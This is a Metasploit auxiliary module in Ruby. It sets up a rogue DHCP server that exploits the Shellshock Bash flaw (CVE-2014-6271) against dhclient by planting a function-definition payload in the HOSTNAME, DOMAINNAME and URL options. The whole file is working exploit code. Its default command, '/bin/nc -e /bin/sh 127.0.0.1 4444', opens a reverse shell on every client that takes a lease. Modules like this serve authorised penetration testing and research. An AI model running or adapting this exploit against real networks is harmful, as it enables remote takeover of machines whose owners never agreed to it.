# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;
require &#039;rex/proto/dhcp&#039;

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::DHCPServer

  def initialize
    super(
      &#039;Name&#039;        => &#039;DHCP Client Bash Environment Variable Code Injection&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a code injection in specially crafted environment
        variables in Bash, specifically targeting dhclient network configuration
        scripts through the HOSTNAME, DOMAINNAME, and URL DHCP options.
      },
      &#039;Author&#039;      =>
        [
          &#039;scriptjunkie&#039;, &#039;apconole[at]yahoo.com&#039;, # Original DHCP Server auxiliary module
          &#039;Stephane Chazelas&#039;, # Vulnerability discovery
          &#039;Ramon de C Valle&#039; # This module
        ],
      &#039;License&#039; => MSF_LICENSE,
      &#039;Actions&#039;     =>
        [
          [ &#039;Service&#039; ]
        ],
      &#039;PassiveActions&#039; =>
        [
          &#039;Service&#039;
        ],
      &#039;DefaultAction&#039;  => &#039;Service&#039;,
      &#039;References&#039; => [
        [&#039;CVE&#039;, &#039;2014-6271&#039;],
        [&#039;CWE&#039;, &#039;94&#039;],
        [&#039;URL&#039;, &#039;https://securityblog.redhat.com/2014/09/24/bash-specially-crafted-environment-variables-code-injection-attack/&#039;],
        [&#039;URL&#039;, &#039;http://seclists.org/oss-sec/2014/q3/649&#039;,],
        [&#039;URL&#039;, &#039;https://www.trustedsec.com/september-2014/shellshock-dhcp-rce-proof-concept/&#039;,]
      ],
      &#039;DisclosureDate&#039; => &#039;Sep 24 2014&#039;
    )

    register_options(
      [
        OptString.new(&#039;SRVHOST&#039;,     [ true, &#039;The IP of the DHCP server&#039; ]),
        OptString.new(&#039;NETMASK&#039;,     [ true, &#039;The netmask of the local subnet&#039; ]),
        OptString.new(&#039;DHCPIPSTART&#039;, [ false, &#039;The first IP to give out&#039; ]),
        OptString.new(&#039;DHCPIPEND&#039;,   [ false, &#039;The last IP to give out&#039; ]),
        OptString.new(&#039;ROUTER&#039;,      [ false, &#039;The router IP address&#039; ]),
        OptString.new(&#039;BROADCAST&#039;,   [ false, &#039;The broadcast address to send to&#039; ]),
        OptString.new(&#039;DNSSERVER&#039;,   [ false, &#039;The DNS server IP address&#039; ]),
        # OptString.new(&#039;HOSTNAME&#039;,    [ false, &#039;The optional hostname to assign&#039; ]),
        OptString.new(&#039;HOSTSTART&#039;,   [ false, &#039;The optional host integer counter&#039; ]),
        OptString.new(&#039;FILENAME&#039;,    [ false, &#039;The optional filename of a tftp boot server&#039; ]),
        OptString.new(&#039;CMD&#039;,         [ true, &#039;The command to run&#039;, &#039;/bin/nc -e /bin/sh 127.0.0.1 4444&#039;])
      ], self.class)
  end

  def run
    value = "() { :; }; PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin #{datastore[&#039;CMD&#039;]}"

    # This loop is required because the current DHCP Server exits after the
    # first interaction.
    loop do
      begin
        start_service({
          &#039;HOSTNAME&#039; => value,
          &#039;DOMAINNAME&#039; => value,
          &#039;URL&#039; => value
        }.merge(datastore))

        while dhcp.thread.alive?
          select(nil, nil, nil, 2)
        end

      rescue Interrupt
        break

      ensure
        stop_service
      end
    end
  end

end

